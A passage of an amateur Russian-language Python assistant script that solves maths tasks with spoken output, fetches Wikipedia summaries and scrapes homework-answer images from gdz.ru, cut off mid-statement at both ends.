            if Planet.find('земле') != -1 or Planet.find('земля') != -1 or Planet.find('земли') != -1:
                R = 6371
            elif Planet.find('марсе') != -1 or Planet.find('марс') != -1 or Planet.find('марса') != -1:
                R = 3389.5
            elif Planet.find('солнце') != -1 or Planet.find('солнца') != -1:
                R = 695510
            elif Planet.find('юпитере') != -1 or Planet.find('юпитер') != -1 or Planet.find('юпитера') != -1:
                R = 69911
            elif Planet.find('луне') != -1 or Planet.find('луна') != -1 or Planet.find('луны') != -1:
                R = 1737.1
            elif Planet.find('сатурне') != -1 or Planet.find('сатурн') != -1 or Planet.find('сатурна') != -1:
                R = 58232
            elif Planet.find('уране') != -1 or Planet.find('уран') != -1 or Planet.find('урана') != -1:
                R = 25362
            elif Planet.find('венере') != -1 or Planet.find('венера') != -1 or Planet.find('венеры') != -1:
                R = 6051.8
            elif Planet.find('меркурие') != -1 or Planet.find('меркурий') != -1 or Planet.find('меркурия') != -1:
                R = 2439.7
            elif Planet.find('непруне') != -1 or Planet.find('нептун') != -1 or Planet.find('нептуна') != -1:
                R = 24622
            elif Planet.find('плутоне') != -1 or Planet.find('плутон') != -1 or Planet.find('плутона') != -1:
                R = 1188.3
            else:
                R = float(input('Введите радиус объекта на котором вы стоите: '))
            print('R =', R, 'км')
            h = input('Введите высоту над уровнем моря: ')
            sign = h[-2:]
            sign2 = h[-1]
            if sign == 'км' or sign == 'km':
                h = int(h[:-2])
            elif sign2 == 'м' or sign2 == 'm':
                h = int(h[:-1]) / 1000

            l = sqrt(2 * R * h)
            print('l =', round(l), 'км =', round(l * 1000), 'м')

    if mess.find('уравнен') != -1:
        if mess.find('квадратн') != -1:
            def quadratic_equation():
                print('a * x² + b * x + c = 0')
                a = int(input('a: '))
                b = int(input('b: '))
                c = int(input('c: '))
                if a != 0 and b != 0 and c != 0:
                    if a == 0:
                        print('Это не квадратное уравнение')
                        talk('Это не квадратное уравнение')
                    if b < 0:
                        bs = '(' + str(b) + ')'
                    else:
                        bs = ''
                    D = b * b - 4 * a * c
                    print('D = b² - 4 * a * c = ⋅⋅⋅ \n              ⋅⋅⋅ = ', bs, '² - 4 * ', a, ' * ', c, ' = ', D,
                          sep='')
                    if D < 0:
                        print('У уравнения нет корней')
                        talk('У. Уравнения нет корней')
                    if D > 0:
                        x1 = (-b - sqrt(D)) / (2 * a)
                        if (len(str(x1).split('.')[1])) > 3:
                            about_x1 = ' ≈ ' + str(round(x1, 3))
                            about_x1_talk = str(about_x1[3:])

                            if type(round(x1, 3)) == float:
                                massiv = about_x1_talk.split('.')
                                massiv.insert(1, ' точка ')
                                if len(massiv[2]) == 1:
                                    massiv.insert(3, ' десятых')
                                if len(massiv[2]) == 2:
                                    massiv.insert(3, ' сотых')
                                if len(massiv[2]) == 3:
                                    massiv.insert(3, ' тысячных')
                                about_x1_talk = ''.join(massiv)

                            if about_x1_talk[0] == '-':
                                about_x1_talk = 'минус ' + about_x1_talk[1:]
                        else:
                            about_x1 = ''
                            about_x1_talk = str(x1)
                            massiv = about_x1_talk.split('.')
                            if massiv[1] == '0':
                                about_x1_talk = about_x1_talk[:-2]
                            else:
                                if type(x1) == float:
                                    massiv.insert(1, ' точка ')
                                    if len(massiv[2]) == 1:
                                        massiv.insert(3, ' десятых')
                                    if len(massiv[2]) == 2:
                                        massiv.insert(3, ' сотых')
                                    if len(massiv[2]) == 3:
                                        massiv.insert(3, ' тысячных')
                                    about_x1_talk = ''.join(massiv)
                            if about_x1_talk[0] == '-':
                                about_x1_talk = 'минус ' + about_x1_talk[1:]

                        x2 = (-b + sqrt(D)) / (2 * a)
                        if (len(str(x2).split('.')[1])) > 3:
                            about_x2 = ' ≈ ' + str(round(x2, 3))
                            about_x2_talk = str(about_x2[3:])
                            if type(round(x2, 3)) == float:
                                massiv = about_x2_talk.split('.')
                                massiv.insert(1, ' точка ')
                                if len(massiv[2]) == 1:
                                    massiv.insert(3, ' десятых')
                                if len(massiv[2]) == 2:
                                    massiv.insert(3, ' сотых')
                                if len(massiv[2]) == 3:
                                    massiv.insert(3, ' тысячных')
                                about_x2_talk = ''.join(massiv)
                            if about_x2_talk[0] == '-':
                                about_x2_talk = 'минус ' + about_x2_talk[1:]
                        else:
                            about_x2 = ''
                            about_x2_talk = str(x2)
                            massiv = about_x2_talk.split('.')
                            if massiv[1] == '0':
                                about_x2_talk = about_x2_talk[:-2]
                            else:
                                if type(x2) == float:
                                    massiv.insert(1, ' точка ')
                                    if len(massiv[2]) == 1:
                                        massiv.insert(3, ' десятых')
                                    if len(massiv[2]) == 2:
                                        massiv.insert(3, ' сотых')
                                    if len(massiv[2]) == 3:
                                        massiv.insert(3, ' тысячных')
                                    about_x2_talk = ''.join(massiv)
                            if about_x2_talk[0] == '-':
                                about_x2_talk = 'минус ' + about_x2_talk[1:]
                        print('\n      -b + √D     ', -b, ' + √', D, '\nx₁ = --------- = ',
                              '-' * (len(str(-b)) + len(str(D)) + 6), ' = ', x1, about_x1,
                              '\n        2 * a  ', ' ' * int(((len(str(-b)) + len(str(D)) + 3) / 2)), '2 * ', a, '\n',
                              sep='')
                        print('\n      -b - √D     ', -b, ' - √', D, '\nx₂ = --------- = ',
                              '-' * (len(str(-b)) + len(str(D)) + 6), ' = ', x2, about_x2,
                              '\n        2 * a  ', ' ' * int(((len(str(-b)) + len(str(D)) + 3) / 2)), '2 * ', a, '\n',
                              sep='')
                        talk('x первый равен ' + str(about_x1_talk))
                        talk('x второй равен ' + str(about_x2_talk))
                    if D == 0:
                        x = -b / (2 * a)
                        print('x = -b / (2 * a) =', x)
                        about_x_talk = str(x)
                        massiv = about_x_talk.split('.')
                        if massiv[1] == '0':
                            about_x_talk = about_x_talk[:-2]
                        else:
                            if type(x) == float:
                                massiv.insert(1, ' точка ')
                                if len(massiv[2]) == 1:
                                    massiv.insert(3, ' десятых')
                                if len(massiv[2]) == 2:
                                    massiv.insert(3, ' сотых')
                                if len(massiv[2]) == 3:
                                    massiv.insert(3, ' тысячных')
                                about_x_talk = ''.join(massiv)
                        if about_x_talk[0] == '-':
                            about_x_talk = 'минус ' + about_x_talk[1:]
                        talk('x равен ' + about_x_talk)
                elif b == 0 and c == 0:
                    print(a, ' * x² = 0\n\
            x = 0', sep='')
                    talk('x, равен нулю')

                elif c == 0:
                    x2 = -b / a
                    print(a, ' * x² + ', b, ' * x = 0\nx₁ = 0      ', a, ' * x₂ + ', b, ' = 0\n', a, ' * x₂ = ', -b,
                          '\nx₂ = ', -b, ' / ', a, ' = ', x2, sep='')
                    talk('x первый равен нулю')
                    talk('x второй равен' + str(x2))
                elif b == 0:

                    ca = round(c / a)
                    if ca < 0:
                        print('Это не квадратное уравнение')
                        talk('Это не квадратное уравнение')
                        exit(0)
                    x1 = sqrt(ca)
                    if (len(str(x1).split('.')[1])) > 3:
                        about_x1 = ' ≈ ' + str(round(x1, 3))
                        about_x1_talk = str(about_x1[3:])
                        if type(round(x1, 3)) == float:
                            massiv = about_x1_talk.split('.')
                            massiv.insert(1, ' точка ')
                            if len(massiv[2]) == 1:
                                massiv.insert(3, ' десятых')
                            if len(massiv[2]) == 2:
                                massiv.insert(3, ' сотых')
                            if len(massiv[2]) == 3:
                                massiv.insert(3, ' тысячных')
                            about_x1_talk = ''.join(massiv)
                        if about_x1_talk[0] == '-':
                            about_x1_talk = 'минус ' + about_x1_talk[1:]
                    else:
                        about_x1 = ''
                        about_x1_talk = str(x1)
                        massiv = about_x1_talk.split('.')
                        if massiv[1] == '0':
                            about_x1_talk = about_x1_talk[:-2]
                        else:
                            if type(x1) == float:
                                massiv.insert(1, ' точка ')
                                if len(massiv[2]) == 1:
                                    massiv.insert(3, ' десятых')
                                if len(massiv[2]) == 2:
                                    massiv.insert(3, ' сотых')
                                if len(massiv[2]) == 3:
                                    massiv.insert(3, ' тысячных')
                                about_x1_talk = ''.join(massiv)
                        if about_x1_talk[0] == '-':
                            about_x1_talk = 'минус ' + about_x1_talk[1:]

                    x2 = -sqrt(ca)
                    if (len(str(x2).split('.')[1])) > 3:
                        about_x2 = ' ≈ ' + str(round(x2, 3))
                        about_x2_talk = str(about_x2[3:])
                        if type(round(x2, 3)) == float:
                            massiv = about_x2_talk.split('.')
                            massiv.insert(1, ' точка ')
                            if len(massiv[2]) == 1:
                                massiv.insert(3, ' десятых')
                            if len(massiv[2]) == 2:
                                massiv.insert(3, ' сотых')
                            if len(massiv[2]) == 3:
                                massiv.insert(3, ' тысячных')
                            about_x2_talk = ''.join(massiv)
                        if about_x2_talk[0] == '-':
                            about_x2_talk = 'минус ' + about_x2_talk[1:]
                    else:
                        about_x2 = ''
                        about_x2_talk = str(x2)
                        massiv = about_x1_talk.split('.')
                        if massiv[1] == '0':
                            about_x2_talk = about_x2_talk[:-2]
                        else:
                            if type(x2) == float:
                                massiv.insert(1, ' точка ')
                                if len(massiv[2]) == 1:
                                    massiv.insert(3, ' десятых')
                                if len(massiv[2]) == 2:
                                    massiv.insert(3, ' сотых')
                                if len(massiv[2]) == 3:
                                    massiv.insert(3, ' тысячных')
                                about_x2_talk = ''.join(massiv)
                        if about_x2_talk[0] == '-':
                            about_x2_talk = 'минус ' + about_x2_talk[1:]
                    print(a, ' * x² + ', c, ' = 0\n', a, ' * x² = ', -c, '\nx² = ', -c, '/', a, '\nx₁ = √', -c, '/', a,
                          ' = ', x1, about_x1, '\nx₂ = -√', -c, '/', a, ' = ', x2, about_x2, sep='')
                    talk('x первый равен' + about_x1_talk)
                    talk('x второй равен' + about_x2_talk)


            quadratic_equation()


    if mess.find('умножить') != -1 or mess.find('умножь') != -1 or mess.find('*') != -1:
  
        mess_operation = mess.split(' ')
        if any(map(str.isdigit, mess_operation[0])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
            result_multiplication = (float(mess_operation[0])) * (float(mess_operation[-1]))
            print('{0:,}'.format(result_multiplication).replace(',', ' '))
            if type(result_multiplication) == float:
                result_multiplication = round(result_multiplication, 3)
                multiplication_talk = str(result_multiplication)
                massiv = multiplication_talk.split('.')
                if massiv[1] == '0':
                    multiplication_talk = multiplication_talk[:-2]
                else:
                    massiv.insert(1, ' точка ')
                    if len(massiv[2]) == 1:
                        massiv.insert(3, ' десятых')
                    if len(massiv[2]) == 2:
                        massiv.insert(3, ' сотых')
                    if len(massiv[2]) == 3:
                        massiv.insert(3, ' тысячных')
                    multiplication_talk = ''.join(massiv)
                if multiplication_talk[0] == '-':
                    multiplication_talk = 'минус ' + multiplication_talk[1:]
            talk(multiplication_talk)
        if any(map(str.isdigit, mess_operation[1])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
            result_multiplication = (float(mess_operation[1])) * (float(mess_operation[-1]))
            print('{0:,}'.format(result_multiplication).replace(',', ' '))
            if type(result_multiplication) == float:
                result_multiplication = round(result_multiplication, 3)
                multiplication_talk = str(result_multiplication)
                massiv = multiplication_talk.split('.')
                if massiv[1] == '0':
                    multiplication_talk = multiplication_talk[:-2]
                else:
                    massiv.insert(1, ' точка ')
                    if len(massiv[2]) == 1:
                        massiv.insert(3, ' десятых')
                    if len(massiv[2]) == 2:
                        massiv.insert(3, ' сотых')
                    if len(massiv[2]) == 3:
                        massiv.insert(3, ' тысячных')
                    multiplication_talk = ''.join(massiv)
                if multiplication_talk[0] == '-':
                    multiplication_talk = 'минус ' + multiplication_talk[1:]
            talk(multiplication_talk)

    if mess.find('разделить') != -1 or mess.find('раздели') != -1 or mess.find('/') != -1:
        
        
        mess_operation = mess.split(' ')
        if any(map(str.isdigit, mess_operation[0])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
            result_multiplication = (float(mess_operation[0])) / (float(mess_operation[-1]))
            print('{0:,}'.format(result_multiplication).replace(',', ' '))
            if type(result_multiplication) == float:
                result_multiplication = round(result_multiplication, 3)
                division_talk = str(result_multiplication)
                massiv = division_talk.split('.')
                if massiv[1] == '0':
                    division_talk = division_talk[:-2]
                else:
                    massiv.insert(1, ' точка ')
                    if len(massiv[2]) == 1:
                        massiv.insert(3, ' десятых')
                    if len(massiv[2]) == 2:
                        massiv.insert(3, ' сотых')
                    if len(massiv[2]) == 3:
                        massiv.insert(3, ' тысячных')
                    division_talk = ''.join(massiv)
                if division_talk[0] == '-':
                    division_talk = 'минус ' + division_talk[1:]
            talk(str(division_talk))
        if any(map(str.isdigit, mess_operation[1])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
            result_multiplication = (float(mess_operation[1])) / (float(mess_operation[-1]))
            print('{0:,}'.format(result_multiplication).replace(',', ' '))
            if type(result_multiplication) == float:
                result_multiplication = round(result_multiplication, 3)
                division_talk = str(result_multiplication)
                massiv = division_talk.split('.')
                if massiv[1] == '0':
                    division_talk = division_talk[:-2]
                else:
                    massiv.insert(1, ' точка ')
                    if len(massiv[2]) == 1:
                        massiv.insert(3, ' десятых')
                    if len(massiv[2]) == 2:
                        massiv.insert(3, ' сотых')
                    if len(massiv[2]) == 3:
                        massiv.insert(3, ' тысячных')
                    division_talk = ''.join(massiv)
                if division_talk[0] == '-':
                    division_talk = 'минус ' + division_talk[1:]
            talk(division_talk)

    if mess.find('плюс') != -1 or mess.find('сложить') != -1 or mess.find('сложи') != -1 or mess.find('+') != -1:
      
        mess_operation = mess.split(' ')
        if any(map(str.isdigit, mess_operation[0])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
            result_multiplication = (float(mess_operation[0])) + (float(mess_operation[-1]))
            print('{0:,}'.format(result_multiplication).replace(',', ' '))
            if type(result_multiplication) == float:
                result_multiplication = round(result_multiplication, 3)
                division_talk = str(result_multiplication)
                massiv = division_talk.split('.')
                if massiv[1] == '0':
                    division_talk = division_talk[:-2]
                else:
                    massiv.insert(1, ' точка ')
                    if len(massiv[2]) == 1:
                        massiv.insert(3, ' десятых')
                    if len(massiv[2]) == 2:
                        massiv.insert(3, ' сотых')
                    if len(massiv[2]) == 3:
                        massiv.insert(3, ' тысячных')
                    division_talk = ''.join(massiv)
                if division_talk[0] == '-':
                    division_talk = 'минус ' + division_talk[1:]
            talk(str(division_talk))
        if any(map(str.isdigit, mess_operation[1])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
            result_multiplication = (float(mess_operation[1])) + (float(mess_operation[-1]))
            print('{0:,}'.format(result_multiplication).replace(',', ' '))
            if type(result_multiplication) == float:
                result_multiplication = round(result_multiplication, 3)
                division_talk = str(result_multiplication)
                massiv = division_talk.split('.')
                if massiv[1] == '0':
                    division_talk = division_talk[:-2]
                else:
                    massiv.insert(1, ' точка ')
                    if len(massiv[2]) == 1:
                        massiv.insert(3, ' десятых')
                    if len(massiv[2]) == 2:
                        massiv.insert(3, ' сотых')
                    if len(massiv[2]) == 3:
                        massiv.insert(3, ' тысячных')
                    division_talk = ''.join(massiv)
                if division_talk[0] == '-':
                    division_talk = 'минус ' + division_talk[1:]
            talk(division_talk)

    if mess.find('минус') != -1 or mess.find('вычесть') != -1 or mess.find('-') != -1:
        
        mess_operation = mess.split(' ')
        if any(map(str.isdigit, mess_operation[0])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
            result_multiplication = (float(mess_operation[0])) - (float(mess_operation[-1]))
            print('{0:,}'.format(result_multiplication).replace(',', ' '))
            if type(result_multiplication) == float:
                result_multiplication = round(result_multiplication, 3)
                division_talk = str(result_multiplication)
                massiv = division_talk.split('.')
                if massiv[1] == '0':
                    division_talk = division_talk[:-2]
                else:
                    massiv.insert(1, ' точка ')
                    if len(massiv[2]) == 1:
                        massiv.insert(3, ' десятых')
                    if len(massiv[2]) == 2:
                        massiv.insert(3, ' сотых')
                    if len(massiv[2]) == 3:
                        massiv.insert(3, ' тысячных')
                    division_talk = ''.join(massiv)
                if division_talk[0] == '-':
                    division_talk = 'минус ' + division_talk[1:]
            talk(str(division_talk))
        if any(map(str.isdigit, mess_operation[1])) == True and any(map(str.isdigit, mess_operation[-1])) == True:
            result_multiplication = (float(mess_operation[1])) - (float(mess_operation[-1]))
            print('{0:,}'.format(result_multiplication).replace(',', ' '))
            if type(result_multiplication) == float:
                result_multiplication = round(result_multiplication, 3)
                division_talk = str(result_multiplication)
                massiv = division_talk.split('.')
                if massiv[1] == '0':
                    division_talk = division_talk[:-2]
                else:
                    massiv.insert(1, ' точка ')
                    if len(massiv[2]) == 1:
                        massiv.insert(3, ' десятых')
                    if len(massiv[2]) == 2:
                        massiv.insert(3, ' сотых')
                    if len(massiv[2]) == 3:
                        massiv.insert(3, ' тысячных')
                    division_talk = ''.join(massiv)
                if division_talk[0] == '-':
                    division_talk = 'минус ' + division_talk[1:]
            talk(division_talk)

    if mess.find('процент') != -1 or mess.find('проценты') != -1 or mess.find('процентов') != -1:
        if mess.find('процентов') != -1 or mess.find('от') != -1:
            print('Введите еще раз число')
        num = int(input('Введи число: '))
        percent = int(input('Введите процент от числа: '))
        print(percent, '% от ', num, ' = ', (num * percent) / 100, sep='')

    if mess.find('компас') != -1 or (mess.find('стороны') != -1 and mess.find('света') != -1):
        print('		 С\n		 ↑\n	 З ←   → В\n		 ↓\n		 Ю')

    if ((mess.find('покажи') != -1 or mess.find('расскажи') != -1 or mess.find('скажи') != -1) \
        and mess.find('про')!= -1) or(mess.find('найди')!= -1 \
        and (mess.find('значение')!= -1 or mess.find('смысл')!= -1 \
        or mess.find('выражения')!= -1 or mess.find('предложения')!= -1 or mess.find('словосочетания')!= -1)) \
        or ((mess.find('что')!= -1 or mess.find('кто')!= -1) and (mess.find('такой')!= -1 or mess.find('значит')!= -1\
        or mess.find('означает')!= -1 or mess.find('такое')!= -1) ) or (mess.find('в') != -1 \
        and (mess.find('википедии') != -1 or mess.find('википедия') != -1)):
        list_words = []
        clean_mess = []
        mess_split = mess.split(' ')
        for a in mess_split:
            if a != 'покажи' and a != 'расскажи' and a != 'скажи' and a != 'про' and a != 'найди' and a != 'значение' \
                    and a != 'смысл' and a != 'что' and a != 'значит' and a != 'означает' and a != 'такое' and a != 'в' \
                    and a != 'википедии' and a != 'выражения' and a != 'предложения' and a != 'словосочетания' and a != 'кто' \
                    and a != 'такой':
                clean_mess.append(a)
        print(''.join(clean_mess))
        translatable_word = ' '.join(clean_mess)
        translator = Translator(from_lang="russian", to_lang="english")
        translatable_word = translator.translate(translatable_word)
        text_ = wikipedia.summary(translatable_word, sentences=1)
        print(text_)

    if mess.find('гдз') != -1 or mess.find('ulp') != -1:

        hack_text = '         ****  *****  *   *  ****    **   ***    *****  *   *  *****\n\
        *      *   *  *   *  *   *   **   *  *   *   *  *   *  *\n\
        *      *   *  *   *  *   *        *   *  *   *  **  *  *\n\
         ***   *   *  *   *  ****         *   *  *   *  * * *  ***\n\
            *  *   *  *   *  *            *   *  *   *  *  **  *\n\
            *  *   *  *   *  *       **   *  *   *   *  *   *  *\n\
        ****   *****  *****  *       **   ***    *****  *   *  *****\n'

        if mess.find('русск') != -1:
            nom = input('Номер: ')
            if nom == '' or nom == None:
                while True:
                    nom = input('Номер: ')
                    if nom != '' and nom != None:
                        break
            url = 'https://gdz.ru/class-7/russkii_yazik/razumovskaja-lvova-7/' + nom + '-nom/'
            print(url, '\n')
            sourse = requests.get(url)
            main_text = sourse.text

            soup = BeautifulSoup(main_text, features='lxml')
            print(hack_text)
            table = soup.findAll('div', {'class': 'with-overtask'})
            index = 0
            for i in table:
                tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                tr = 'https:' + str(tr[0]) + str(tr[1])
                index += 1
                print(tr)

        if mess.find('англ') != -1 and mess.find('язык') != -1:
            if mess.find('тетра') != -1:
                s = input('Страница: ')
                if s == '' or s == None:
                    while True:
                        s = input('Страница: ')
                        if s != '' and s != None:
                            break
                url = 'https://gdz.ru/class-7/english/workbook-spotlight-7/' + s + '-s/'
                print(url, '\n')
                sourse = requests.get(url)
                main_text = sourse.text

                soup = BeautifulSoup(main_text, features='lxml')
                print(hack_text)
                table = soup.findAll('div', {'class': 'with-overtask'})
                index = 0
                for i in table:
                    tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                    tr = 'https:' + str(tr[0]) + str(tr[1])
                    index += 1
                    print(tr)
            else:
                s = input('Страница: ')
                if s == '' or s == None:
                    while True:
                        s = input('Страница: ')
                        if s != '' and s != None:
                            break
                url = 'https://gdz.ru/class-7/english/reshebnik-angliyskiy-v-fokuse-vaulina-yu-e/' + s + '-s/'
                print(url, '\n')
                sourse = requests.get(url)
                main_text = sourse.text

                soup = BeautifulSoup(main_text, features='lxml')
                print(hack_text)
                table = soup.findAll('div', {'class': 'with-overtask'})
                index = 0
                for i in table:
                    tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                    tr = 'https:' + str(tr[0]) + str(tr[1])
                    index += 1
                    print(tr)

        if mess.find('алгебр') != -1:
            if mess.find('дидакти') != -1:
                job = input('Самостоятельная (1); Контрольная (2): ').lower()
                url = ''
                if job == '1' or job == 'сам' or job == '':
                    variant = input('Введите вариант(1, 2): ').lower()

                    if variant == '1' or variant == '' or variant == 'один':
                        k_variant = '1'
                        independent_work = input('Самостоятельная работа номер: ')

                    elif variant == '2' or variant == 'два':
                        k_variant = '2'
                        independent_work = input('Самостоятельная работа номер: ')
                    nom = input('Номер: ')
                    if nom == '' or nom == None:
                        while True:
                            nom = input('Номер: ')
                            if nom != '' and nom != None:
                                break
                    url = 'https://gdz.ru/class-7/algebra/zvavich-kuznecova-15/' + k_variant + '-' + independent_work + '-independ-' + nom + '/'
                if job == '2' or job == 'контр' or job == 'два':
                    kontr_variant = input('Введите название к/р(4a, 4): ').lower()
                    if kontr_variant == '1':
                        k_kontr_variant = '1'
                    elif kontr_variant == '1a' or kontr_variant == '1а':
                        k_kontr_variant = '2'
                    elif kontr_variant == '2':
                        k_kontr_variant = '3'
                    elif kontr_variant == '2a' or kontr_variant == '2а':
                        k_kontr_variant = '4'
                    elif kontr_variant == '3':
                        k_kontr_variant = '5'
                    elif kontr_variant == '3a' or kontr_variant == '3а':
                        k_kontr_variant = '6'
                    elif kontr_variant == '4':
                        k_kontr_variant = "7"
                    elif kontr_variant == '4a' or kontr_variant == '4а':
                        k_kontr_variant = "8"
                    elif kontr_variant == '5':
                        k_kontr_variant = '9'
                    elif kontr_variant == '5a' or kontr_variant == '5а':
                        k_kontr_variant = "10"
                    else:
                        k_kontr_variant = kontr_variant
                    variant = input('Введите вариант: ').lower()
                    if variant == '':
                        variant = '1'
                    nom = input('Номер: ')
                    if nom == '' or nom == None:
                        while True:
                            nom = input('Номер: ')
                            if nom != '' and nom != None:
                                break
                    url = 'https://gdz.ru/class-7/algebra/zvavich-kuznecova-15/' + k_kontr_variant + '-' + variant + '-kontrol-' + nom + '/'

                print(url, '\n')
                sourse = requests.get(url)
                main_text = sourse.text

                soup = BeautifulSoup(main_text, features='lxml')
                print(hack_text)
                table = soup.findAll('div', {'class': 'with-overtask'})
                index = 0
                for i in table:
                    tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                    tr = 'https:' + str(tr[0]) + str(tr[1])
                    index += 1
                    print(tr)
            else:
                nom = input('Номер: ')
                if nom == '' or nom == None:
                    while True:
                        nom = input('Номер: ')
                        if nom != '' and nom != None:
                            break
                url = 'https://gdz.ru/class-7/algebra/makarichev-18/' + nom + '-nom/'
                print(url, '\n')
                sourse = requests.get(url)
                main_text = sourse.text

                soup = BeautifulSoup(main_text, features='lxml')
                print(hack_text)
                table = soup.findAll('div', {'class': 'with-overtask'})
                index = 0
                for i in table:
                    tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                    tr = 'https:' + str(tr[0]) + str(tr[1])
                    index += 1
                    print(tr)

        if mess.find('геомет') != -1:
            if mess.find('дидакт') != -1:
                nom = input('Номер: ')
                if nom == '' or nom == None:
                    while True:
                        nom = input('Номер: ')
                        if nom != '' and nom != None:
                            break
                url = 'https://gdz.ru/class-7/geometria/reshebnik-rabochaya-tetrad-k-uchebniku-geometriya-7-9-atanasyana-l-s/' + nom + '-nom/'
                print(url, '\n')
                sourse = requests.get(url)
                main_text = sourse.text

                soup = BeautifulSoup(main_text, features='lxml')
                print(hack_text)
                table = soup.findAll('div', {'class': 'with-overtask'})
                index = 0
                for i in table:
                    tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                    tr = 'https:' + str(tr[0]) + str(tr[1])
                    index += 1
                    print(tr)
            else:
                nom = input('Номер: ')
                if nom == '' or nom == None:
                    while True:
                        nom = input('Номер: ')
                        if nom != '' and nom != None:
                            break
                url = 'https://gdz.ru/class-7/geometria/atanasyan-7-9/' + nom + '-nom/'
                print(url, '\n')
                sourse = requests.get(url)
                main_text = sourse.text

                soup = BeautifulSoup(main_text, features='lxml')
                print(hack_text)
                table = soup.findAll('div', {'class': 'with-overtask'})
                index = 0
                for i in table:
                    tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                    tr = 'https:' + str(tr[0]) + str(tr[1])
                    index += 1
                    print(tr)

        if mess.find('истори') != -1:
            if mess.find('тетра') != -1:
                job = input('§(1); Итоги главы(2): ').lower()
                if job == '' or job == '1' or job == "один":
                    paragraph = input('§: ')
                    if paragraph == '' or paragraph == None:
                        while True:
                            paragraph = input('Введите параграф: ')
                            if paragraph != '' and paragraph != None:
                                break
                    if paragraph == '6':
                        paragraph = '5'
                    if paragraph == '2':
                        paragraph = '1'
                    if paragraph == '9':
                        paragraph = '8'
                    if paragraph == '22':
                        paragraph = '21'
                    if paragraph == '25':
                        paragraph = '24'
                    url = 'https://gdz.ru/class-7/istoriya/klokov-tetrad/' + paragraph + '-item/'
                else:
                    nom = input('Введите номер главы: ')
                    if nom == '' or nom == None:
                        while True:
                            nom = input('Номер: ')
                            if nom != '' and nom != None:
                                break
                    url = 'https://gdz.ru/class-7/istoriya/klokov-tetrad/' + nom + '-ichapter/'
                print(url, '\n')
                sourse = requests.get(url)
                main_text = sourse.text

                soup = BeautifulSoup(main_text, features='lxml')
                print(hack_text)
                table = soup.findAll('div', {'class': 'with-overtask'})
                index = 0
                for i in table:
                    tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                    tr = 'https:' + str(tr[0]) + str(tr[1])
                    index += 1
                    print(tr)
            else:
                job = input('§(1); Итоги главы(2): ').lower()
                if job == '' or job == '1' or job == "один":
                    paragraph = input('§: ')
                    if paragraph == '' or paragraph == None:
                        while True:
                            paragraph = input('Введите параграф: ')
                            if paragraph != '' and paragraph != None:
                                break

                    if paragraph == '6':
                        paragraph = '5'
                    if paragraph == '2':
                        paragraph = '1'
                    if paragraph == '9':
                        paragraph = '8'
                    if paragraph == '22':
                        paragraph = '21'
                    if paragraph == '25':
                        paragraph = '24'
                    url = 'https://gdz.ru/class-7/istoriya/andreev/' + paragraph + '-item/'
                else:
                    nom = input('Введите номер главы: ')
                    if nom == '' or nom == None:
                        while True:
                            nom = input('Номер: ')
                            if nom != '' and nom != None:
                                break
                    url = 'https://gdz.ru/class-7/istoriya/andreev/' + nom + '-ichapter/'
                print(url, '\n')
                sourse = requests.get(url)
                main_text = sourse.text

                soup = BeautifulSoup(main_text, features='lxml')
                print(hack_text)
                table = soup.findAll('div', {'class': 'with-overtask'})
                index = 0
                for i in table:
                    tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                    tr = 'https:' + str(tr[0]) + str(tr[1])
                    index += 1
                    print(tr)

        if mess.find('хими') != -1:
            paragraph = input('Введите параграф: ')
            if paragraph == '' or paragraph == None:
                while True:
                    paragraph = input('Введите параграф: ')
                    if paragraph != '' and paragraph != None:
                        break
            nom = input('Номер: ')
            if nom == '' or nom == None:
                while True:
                    nom = input('Номер: ')
                    if nom != '' and nom != None:
                        break
            url = 'https://gdz.ru/class-7/himiya/gabrielyan-vvodnij-kurs/' + paragraph + '-quest-' + nom + '/'
            print(url, '\n')
            sourse = requests.get(url)
            main_text = sourse.text

            soup = BeautifulSoup(main_text, features='lxml')
            print(hack_text)
            table = soup.findAll('div', {'class': 'with-overtask'})
            index = 0
            for i in table:
                tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                tr = 'https:' + str(tr[0]) + str(tr[1])
                index += 1
                print(tr)

        if mess.find('литерат') != -1:
            s = input('Страница: ')
            if s == '' or s == None:
                while True:
                    s = input('Страница: ')
                    if s != '' and s != None:
                        break
            if s == '5':
                s = '4'
            elif s == '51':
                s = '50'
            elif s == '76':
                s = '75'
            elif s == '170':
                s = '169'
            elif s == '192':
                s = '191'
            url = 'https://gdz.ru/class-7/literatura/merkin/1-prt-' + s + '/'
            print(url, '\n')
            sourse = requests.get(url)
            main_text = sourse.text

            soup = BeautifulSoup(main_text, features='lxml')
            print(hack_text)
            table = soup.findAll('div', {'class': 'with-overtask'})
            index = 0
            for i in table:
                tr = str(table[index].findAll('img')).split('src="')[1].split('"')[0].split('amp;')
                tr = 'https:' + str(tr[0]) + str(tr[1])
                index += 1
                print(tr)

    if mess.find('трениров') != -1:
        while True:
            a = random.randint(0, 1000)
            b = random.randint(0, 1000)
            c = a * b
            ab = str(a) + ' * ' + str(b) + ' = '
            user_response = input(ab)
            if user_response.isdigit() == False:
                while True:
                    if user_response == 'стоп':
                        break
                    user_response = input(ab)
                    if user_response.isdigit() == True:
                        break
            if user_response == 'стоп':
                break
            if int(user_response) == c:
                cprint(' ' * int(len(str(ab) + str(c))), 'green', 'on_green')
                print('    Верно')
            else:
                cprint(' ' * int(len(str(ab) + str(c))), 'red', 'on_red')
                print('    Не верно')
                print(ab, c, sep='')

    if mess.find('док-во') != -1 or mess.find('докажи') != -1 or mess.find('доказать') != -1 or mess.find('доказатель') != -1:
        print('f')
        if mess.find('сумм') != -1 and mess.find('углов') != -1:
            if mess.find('триугольник') != -1 or mess.find('треугольник') != -1:
                print(
